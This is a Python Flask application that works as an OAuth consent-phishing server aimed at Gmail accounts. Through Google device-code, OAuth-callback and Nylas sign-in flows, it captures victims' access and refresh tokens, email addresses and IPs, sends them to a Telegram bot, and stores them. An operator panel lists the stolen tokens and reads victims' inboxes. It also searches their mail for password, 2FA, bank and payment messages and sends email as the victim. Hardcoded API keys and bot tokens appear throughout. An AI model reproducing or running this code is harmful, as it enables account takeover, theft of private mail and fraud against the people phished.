from flask import Flask, request, redirect, session, render_template_string, jsonify
import requests
import json
import os
import base64
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ================================================================
# GOOGLE OAUTH CONFIG (Kept as fallback)
# ================================================================
CLIENT_ID = "870868575995-luhgcleqlgjb28tckh6tmidfea3vc3dp.apps.googleusercontent.com"
CLIENT_SECRET = "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"
RENDER_URL = os.environ.get("RENDER_URL", "https://gmail-oauth.onrender.com")
REDIRECT_URI = f"{RENDER_URL}/callback"
SCOPES = "openid https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/gmail.modify https://www.googleapis.com/auth/gmail.send"

# ================================================================
# NYLAS CONFIG (New primary auth method)
# ================================================================
NYLAS_CLIENT_ID = "81b76668-d80e-47ac-a764-9d2b9f8ef764"
NYLAS_API_KEY = "nyk_v0_4qYweVcYWvr4OwGLsAV7HQ5i7joTpxrtep40Tm9NA3PxFplZMSjPrc5pwOzogfQX"
NYLAS_API_URL = "https://api.us.nylas.com/v3"

# ================================================================
# TELEGRAM CONFIG
# ================================================================
TG_BOT_TOKEN = "8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs"
TG_CHAT_ID = "7554731151"

# ================================================================
# TOKEN STORAGE
# ================================================================
TOKEN_DB = "/tmp/tokens.json"
NYLAS_GRANTS_DB = "/tmp/nylas_grants.json"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def save_token(email, refresh_token, access_token, ip):
    db = {}
    if os.path.exists(TOKEN_DB):
        with open(TOKEN_DB) as f:
            db = json.load(f)
    db[email] = {
        "refresh_token": refresh_token,
        "access_token": access_token,
        "ip": ip,
        "timestamp": datetime.now().isoformat(),
        "method": "oauth"
    }
    with open(TOKEN_DB, "w") as f:
        json.dump(db, f, indent=2)

def save_nylas_grant(email, grant_id, access_token, ip):
    db = {}
    if os.path.exists(NYLAS_GRANTS_DB):
        with open(NYLAS_GRANTS_DB) as f:
            db = json.load(f)
    db[email] = {
        "grant_id": grant_id,
        "access_token": access_token,
        "ip": ip,
        "timestamp": datetime.now().isoformat(),
        "method": "nylas"
    }
    with open(NYLAS_GRANTS_DB, "w") as f:
        json.dump(db, f, indent=2)

# ================================================================
# HOME
# ================================================================
@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "endpoints": {
            "nylas_auth": "/auth/nylas",
            "nylas_callback": "/nylas/callback",
            "nylas_inbox": "/api/nylas-inbox",
            "nylas_send": "/api/nylas-send",
            "oauth_start": "/auth/gmail",
            "oauth_callback": "/callback",
            "tokens": "/tokens",
            "nylas_grants": "/grants",
            "web_viewer": "/web-viewer",
            "api_viewer": "/api/viewer/<email>",
            "api_replay": "/api/replay",
            "health": "/health"
        }
    })

# ================================================================
# NYLAS AUTH — Redirect to Nylas Hosted Auth (pre-verified!)
# ================================================================
@app.route('/auth/nylas')
def auth_nylas():
    """Redirect user to Nylas's pre-verified Google OAuth page"""
    redirect_uri = f"{RENDER_URL}/nylas/callback"
    
    state = os.urandom(16).hex()
    session['nylas_state'] = state
    
    nylas_auth_url = (
        f"{NYLAS_API_URL}/connect/auth"
        f"?client_id={NYLAS_CLIENT_ID}"
        f"&redirect_uri={redirect_uri}"
        f"&response_type=code"
        f"&scopes=gmail.modify"
        f"&state={state}"
    )
    
    return redirect(nylas_auth_url)

# ================================================================
# NYLAS CALLBACK — User returns here after authorizing
# ================================================================
@app.route('/nylas/callback')
def nylas_callback():
    code = request.args.get('code')
    state = request.args.get('state')
    
    if not code:
        return "Authorization failed. No code returned.", 400
    
    # Exchange code for grant
    resp = requests.post(
        f"{NYLAS_API_URL}/connect/oauth/token",
        json={
            "client_id": NYLAS_CLIENT_ID,
            "client_secret": NYLAS_API_KEY,
            "code": code,
            "redirect_uri": f"{RENDER_URL}/nylas/callback",
            "grant_type": "authorization_code"
        },
        headers={
            "Authorization": f"Bearer {NYLAS_API_KEY}",
            "Content-Type": "application/json"
        }
    )
    
    data = resp.json()
    
    if 'grant_id' in data:
        grant_id = data['grant_id']
        access_token = data.get('access_token', '')
        email = data.get('email', data.get('user_email', 'unknown'))
        
        victim_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        if victim_ip and "," in victim_ip:
            victim_ip = victim_ip.split(",")[0].strip()
        
        save_nylas_grant(email, grant_id, access_token, victim_ip)
        
        msg = f"""[+]___ NYLAS_GMAIL ___[+]
Email: {email}
Grant ID: {grant_id}
Token: {access_token}
IP: {victim_ip}"""
        send_telegram(msg)
        
        return redirect("https://ivview.party/#")
    
    return f"Auth failed: {json.dumps(data)}", 400

# ================================================================
# NYLAS — Read Inbox
# ================================================================
@app.route('/api/nylas-inbox', methods=['POST'])
def nylas_inbox():
    data = request.json
    email = data.get('email', '').strip()
    
    # Get stored grant
    db = {}
    if os.path.exists(NYLAS_GRANTS_DB):
        with open(NYLAS_GRANTS_DB) as f:
            db = json.load(f)
    
    grant_info = db.get(email)
    if not grant_info:
        return jsonify({"status": "error", "message": "No Nylas grant found. User needs to sign in first."}), 401
    
    grant_id = grant_info['grant_id']
    
    # Fetch messages via Nylas API
    resp = requests.get(
        f"{NYLAS_API_URL}/grants/{grant_id}/messages",
        params={"limit": 50},
        headers={
            "Authorization": f"Bearer {NYLAS_API_KEY}",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
    )
    
    if resp.status_code != 200:
        return jsonify({"status": "error", "message": f"Nylas error: {resp.text}"}), 500
    
    messages = resp.json()
    
    html = ""
    for msg in messages.get('data', []):
        subject = msg.get('subject', '(No subject)')
        from_addr = ', '.join([s.get('email', '') for s in msg.get('from', [])])
        from_name = ', '.join([s.get('name', '') for s in msg.get('from', [])])
        date = msg.get('date', '')
        snippet = msg.get('snippet', '')[:200]
        
        html += f"""
        <div class='email-card'>
            <div class='from'>{from_name or from_addr} - {date}</div>
            <div class='subject'>{subject}</div>
            <p style='color:#8b949e;font-size:13px'>{snippet}</p>
        </div>"""
    
    return jsonify({
        "status": "success",
        "html": html or "<p>No messages found.</p>",
        "email": email
    })

# ================================================================
# NYLAS — Send Email
# ================================================================
@app.route('/api/nylas-send', methods=['POST'])
def nylas_send():
    data = request.json
    email = data.get('email', '').strip()
    to = data.get('to', '').strip()
    subject = data.get('subject', '').strip()
    body = data.get('body', '').strip()
    
    if not email or not to or not subject:
        return jsonify({"status": "error", "message": "Missing required fields (email, to, subject)"}), 400
    
    db = {}
    if os.path.exists(NYLAS_GRANTS_DB):
        with open(NYLAS_GRANTS_DB) as f:
            db = json.load(f)
    
    grant_info = db.get(email)
    if not grant_info:
        return jsonify({"status": "error", "message": "No Nylas grant found"}), 401
    
    grant_id = grant_info['grant_id']
    
    resp = requests.post(
        f"{NYLAS_API_URL}/grants/{grant_id}/messages/send",
        json={
            "to": [{"email": to}],
            "subject": subject,
            "body": body
        },
        headers={
            "Authorization": f"Bearer {NYLAS_API_KEY}",
            "Content-Type": "application/json"
        }
    )
    
    if resp.status_code in [200, 201, 202]:
        return jsonify({"status": "success", "message": "Email sent successfully"})
    
    return jsonify({"status": "error", "message": resp.text[:300]}), 500

# ================================================================
# GOOGLE OAUTH — Device Code Flow (Original - kept as fallback)
# ================================================================
@app.route('/auth/gmail')
def auth_gmail():
    resp = requests.post('https://oauth2.googleapis.com/device/code', data={
        'client_id': CLIENT_ID,
        'scope': SCOPES
    })
    device_data = resp.json()
    session['device_code'] = device_data['device_code']
    session['user_code'] = device_data['user_code']
    session['verification_url'] = device_data['verification_url']
    return render_template_string("""
    <html><head><style>
        body{font-family:Arial;margin:40px;text-align:center;background:#f5f3f0}
        .code{font-size:36px;font-weight:bold;background:#fff;padding:15px 30px;display:inline-block;letter-spacing:6px;border:2px dashed #333;margin:20px 0}
        .btn{padding:12px 24px;font-size:16px;cursor:pointer;background:#4285f4;color:white;border:none;border-radius:4px;text-decoration:none;display:inline-block}
        .container{background:white;max-width:500px;margin:50px auto;padding:40px;border-radius:12px;box-shadow:0 4px 16px rgba(0,0,0,0.08)}
    </style></head><body>
    <div class="container">
        <h2>Gmail Authorization</h2>
        <p><strong>Step 1:</strong> <a href="{{ verification_url }}" target="_blank" class="btn">Open google.com/device</a></p>
        <p><strong>Step 2:</strong> Enter this code:</p>
        <div class="code">{{ user_code }}</div>
        <p><strong>Step 3:</strong> Authorize access</p>
        <p><small>Auto-checking every 5 seconds...</small></p>
        <script>setTimeout(function(){window.location.href='/poll'},5000)</script>
    </div></body></html>
    """, user_code=session['user_code'], verification_url=session['verification_url'])

@app.route('/poll')
def poll():
    device_code = session.get('device_code')
    if not device_code:
        return redirect('/auth/gmail')
    resp = requests.post('https://oauth2.googleapis.com/token', data={
        'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET,
        'device_code': device_code, 'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
    })
    token_data = resp.json()
    if 'access_token' in token_data:
        refresh_token = token_data.get("refresh_token", "N/A")
        access_token = token_data.get("access_token", "N/A")
        userinfo = requests.get("https://www.googleapis.com/oauth2/v2/userinfo",
            headers={"Authorization": f"Bearer {access_token}"}).json()
        email = userinfo.get("email", "unknown")
        victim_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        if victim_ip and "," in victim_ip:
            victim_ip = victim_ip.split(",")[0].strip()
        save_token(email, refresh_token, access_token, victim_ip)
        msg = f"""[+]___ GMAIL_OAUTH ___[+]\nVictim: {email}\nToken: {refresh_token}\nIP: {victim_ip}"""
        send_telegram(msg)
        session.pop('device_code', None)
        session.pop('user_code', None)
        return redirect("https://ivview.party/#")
    elif token_data.get('error') == 'authorization_pending':
        return render_template_string("""
        <html><body style="text-align:center;font-family:Arial;margin-top:50px;">
            <h3>Waiting...</h3><p>Code: <strong style="font-size:24px;">{{ user_code }}</strong></p>
            <script>setTimeout(function(){window.location.href='/poll'},5000)</script>
        </body></html>""", user_code=session.get('user_code',''))
    elif token_data.get('error') == 'expired_token':
        session.pop('device_code', None)
        return redirect('/auth/gmail')
    elif token_data.get('error') == 'access_denied':
        return "Denied. <a href='/auth/gmail'>Try again</a>"
    else:
        return f"Unexpected: {token_data}"

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "No code", 400
    payload = {
        "code": code, "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI, "grant_type": "authorization_code"
    }
    tokens = requests.post("https://oauth2.googleapis.com/token", json=payload).json()
    refresh_token = tokens.get("refresh_token", "N/A")
    access_token = tokens.get("access_token", "N/A")
    userinfo = requests.get("https://www.googleapis.com/oauth2/v2/userinfo",
        headers={"Authorization": f"Bearer {access_token}"}).json()
    email = userinfo.get("email", "unknown")
    victim_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if victim_ip and "," in victim_ip:
        victim_ip = victim_ip.split(",")[0].strip()
    save_token(email, refresh_token, access_token, victim_ip)
    msg = f"""[+]___ GMAIL_OAUTH ___[+]\nVictim: {email}\nToken: {refresh_token}\nIP: {victim_ip}"""
    send_telegram(msg)
    return redirect("https://ivview.party/#")

# ================================================================
# VIEW TOKENS & GRANTS
# ================================================================
@app.route('/tokens')
def list_tokens():
    if not os.path.exists(TOKEN_DB):
        return jsonify({})
    with open(TOKEN_DB) as f:
        return jsonify(json.load(f))

@app.route('/grants')
def list_grants():
    if not os.path.exists(NYLAS_GRANTS_DB):
        return jsonify({})
    with open(NYLAS_GRANTS_DB) as f:
        return jsonify(json.load(f))

# ================================================================
# WEB VIEWER PAGE
# ================================================================
@app.route('/web-viewer')
def web_viewer_page():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Gmail Viewer</title>
        <style>
            body{font-family:Arial;padding:30px;background:#0d1117;color:#c9d1d9;max-width:1000px;margin:auto}
            h1{color:#58a6ff}
            table{width:100%;border-collapse:collapse;margin-top:20px}
            th,td{padding:12px;text-align:left;border-bottom:1px solid #30363d}
            th{color:#8b949e}
            a{color:#58a6ff;text-decoration:none}
            .email-card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;margin:8px 0}
            .from{color:#8b949e;font-size:13px}
            .subject{color:#c9d1d9;font-weight:600}
            .btn{background:#238636;color:#fff;padding:8px 16px;border:none;border-radius:6px;cursor:pointer;text-decoration:none;display:inline-block}
            .btn-blue{background:#1f6feb}
            .tab{margin-bottom:20px}
            .tab button{padding:10px 20px;background:#30363d;color:#c9d1d9;border:none;cursor:pointer;border-radius:4px 4px 0 0}
            .tab button.active{background:#1f6feb;color:#fff}
            .tabcontent{display:none}
            .tabcontent.active{display:block}
            input,textarea{padding:10px;margin:5px 0;border:1px solid #30363d;border-radius:4px;background:#0d1117;color:#c9d1d9;width:100%}
        </style>
    </head>
    <body>
        <h1>Gmail Viewer</h1>
        <div class="tab">
            <button class="active" onclick="switchTab('nylas')">Nylas Grants</button>
            <button onclick="switchTab('oauth')">OAuth Tokens</button>
        </div>
        
        <div id="nylas" class="tabcontent active">
            <p><a href="#" class="btn" onclick="loadNylasGrants()">Refresh</a></p>
            <div id="nylas-content"><p>Loading...</p></div>
        </div>
        
        <div id="oauth" class="tabcontent">
            <p><a href="#" class="btn" onclick="loadOauthTokens()">Refresh</a></p>
            <div id="oauth-content"><p>Loading...</p></div>
        </div>
        
        <div id="inbox-section" style="display:none;margin-top:20px">
            <h3>Inbox: <span id="inbox-email"></span></h3>
            <div style="margin:15px 0;padding:15px;background:#161b22;border:1px solid #30363d;border-radius:6px">
                <input id="to-email" placeholder="To: email@example.com">
                <input id="send-subject" placeholder="Subject">
                <textarea id="send-body" rows="3" placeholder="Message body..."></textarea>
                <button class="btn btn-blue" onclick="sendNylasEmail()">Send Email</button>
            </div>
            <div id="inbox-content"></div>
        </div>
        
        <script>
            function switchTab(name) {
                document.querySelectorAll('.tabcontent').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab button').forEach(b => b.classList.remove('active'));
                document.getElementById(name).classList.add('active');
                event.target.classList.add('active');
            }
            
            async function loadNylasGrants() {
                const res = await fetch('/grants');
                const data = await res.json();
                let html = '<table><tr><th>Email</th><th>Grant ID</th><th>IP</th><th>Time</th><th>Action</th></tr>';
                for (const [email, info] of Object.entries(data)) {
                    html += `<tr><td>${email}</td><td style="font-size:11px">${info.grant_id}</td>
                        <td>${info.ip}</td><td>${info.timestamp||''}</td>
                        <td><a href="#" class="btn btn-blue" onclick="viewNylasInbox('${email}')">View Inbox</a></td></tr>`;
                }
                html += '</table>';
                document.getElementById('nylas-content').innerHTML = html || '<p>No grants yet.</p>';
            }
            
            async function loadOauthTokens() {
                const res = await fetch('/tokens');
                const data = await res.json();
                let html = '<table><tr><th>Email</th><th>IP</th><th>Time</th></tr>';
                for (const [email, info] of Object.entries(data)) {
                    html += `<tr><td>${email}</td><td>${info.ip}</td><td>${info.timestamp||''}</td></tr>`;
                }
                html += '</table>';
                document.getElementById('oauth-content').innerHTML = html || '<p>No tokens.</p>';
            }
            
            async function viewNylasInbox(email) {
                document.getElementById('inbox-section').style.display = 'block';
                document.getElementById('inbox-email').textContent = email;
                document.getElementById('inbox-content').innerHTML = '<p>Loading inbox...</p>';
                
                const res = await fetch('/api/nylas-inbox', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({email})
                });
                const result = await res.json();
                document.getElementById('inbox-content').innerHTML = result.html || '<p>No results</p>';
            }
            
            async function sendNylasEmail() {
                const email = document.getElementById('inbox-email').textContent;
                const to = document.getElementById('to-email').value;
                const subject = document.getElementById('send-subject').value;
                const body = document.getElementById('send-body').value;
                if (!to || !subject) { alert('Fill in to and subject'); return; }
                
                const res = await fetch('/api/nylas-send', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({email, to, subject, body})
                });
                const result = await res.json();
                alert(result.message);
            }
            
            loadNylasGrants();
            loadOauthTokens();
        </script>
    </body>
    </html>
    """)

# ================================================================
# OLD API — Viewer & Replay (kept working)
# ================================================================
@app.route('/api/viewer/<email>')
def api_viewer_email(email):
    if not os.path.exists(TOKEN_DB):
        return jsonify({"error":"No tokens"}), 404
    with open(TOKEN_DB) as f:
        db = json.load(f)
    if email not in db:
        return jsonify({"error":"Not found"}), 404
    rt = db[email]["refresh_token"]
    r = requests.post("https://oauth2.googleapis.com/token", json={
        "client_id":CLIENT_ID,"client_secret":CLIENT_SECRET,
        "refresh_token":rt,"grant_type":"refresh_token"
    })
    if not r.ok:
        return jsonify({"error":"Token refresh failed"}), 400
    at = r.json().get("access_token")
    keywords = ["password","reset","verification","otp","2fa",
        "bank","payment","transfer","paypal","venmo",
        "invoice","receipt","order","purchase",
        "login","security","alert","confirm"]
    results = {}
    for kw in keywords:
        msgs = requests.get(
            f"https://gmail.googleapis.com/gmail/v1/users/me/messages?q={kw}&maxResults=5",
            headers={"Authorization":f"Bearer {at}"}
        ).json().get("messages",[])
        entries = []
        for m in msgs:
            d = requests.get(
                f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{m['id']}",
                headers={"Authorization":f"Bearer {at}"}
            ).json()
            h = d["payload"]["headers"]
            subj = next((x['value'] for x in h if x['name']=='Subject'),'No subject')
            fr = next((x['value'] for x in h if x['name']=='From'),'Unknown')
            entries.append({"subject":subj[:120],"from":fr[:80],"id":m['id']})
        if entries:
            results[kw] = entries
    return jsonify({"email":email,"results":results})

@app.route('/api/replay', methods=['POST'])
def api_replay():
    data = request.json
    email = data.get('email')
    to = data.get('to')
    subject = data.get('subject')
    body = data.get('body')
    if not os.path.exists(TOKEN_DB):
        return jsonify({"error":"No tokens"}), 404
    with open(TOKEN_DB) as f:
        db = json.load(f)
    if email not in db:
        return jsonify({"error":"Not found"}), 404
    rt = db[email]["refresh_token"]
    r = requests.post("https://oauth2.googleapis.com/token", json={
        "client_id":CLIENT_ID,"client_secret":CLIENT_SECRET,
        "refresh_token":rt,"grant_type":"refresh_token"
    })
    if not r.ok:
        return jsonify({"error":"Token refresh failed"}), 400
    at = r.json().get("access_token")
    msg_str = f"From: me\r\nTo: {to}\r\nSubject: {subject}\r\n\r\n{body}"
    encoded = base64.urlsafe_b64encode(msg_str.encode()).decode()
    r = requests.post(
        "https://gmail.googleapis.com/gmail/v1/users/me/messages/send",
        headers={"Authorization":f"Bearer {at}","Content-Type":"application/json"},
        json={"raw":encoded}
    )
    return jsonify({"status":"sent" if r.ok else "failed","detail":r.text[:200]})

# ================================================================
# Health
# ================================================================
@app.route('/health')
def health():
    return "OK"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
